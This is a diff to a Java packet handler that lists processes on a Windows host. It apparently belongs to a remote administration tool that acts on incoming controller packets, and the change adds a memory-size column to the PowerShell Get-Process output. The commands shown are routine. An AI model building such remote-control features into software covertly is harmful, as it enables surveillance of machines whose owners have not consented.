@@ -64,7 +64,7 @@ public class Packet19ListProcesses extends AbstractIncomingPacket {
 			WindowsVersion version = wos.getVersion();
 
 			if (version.ordinal() >= WindowsVersion.WINVISTA.ordinal()) {
-				p = Runtime.getRuntime().exec(new String[] { "powershell", "Get-Process * | Format-Table -Property name,id,path -AutoSize" });
+				p = Runtime.getRuntime().exec(new String[] { "powershell", "Get-Process * | Format-Table -Property name,id,privatememorysize64,path -AutoSize" });
 			} else {
 				p = Runtime.getRuntime().exec("tasklist.exe /fo csv /nh");
 			}
@@ -93,10 +93,16 @@ public class Packet19ListProcesses extends AbstractIncomingPacket {
 				data[0] = sline[0];
 				data[1] = sline[1];
 				
-				if (sline.length >= 3) {
+				try {
+					data[2] = DataUnits.getAsString(Long.parseLong(sline[2]));
+				} catch (NumberFormatException e1) {
+					e1.printStackTrace();
+				}
+
+				if (sline.length >= 4) {
 					String path = "";
 					
-					for (int i = 2; i < sline.length; i++) {
+					for (int i = 3; i < sline.length; i++) {
 						path += sline[i] + " ";
 					}
 
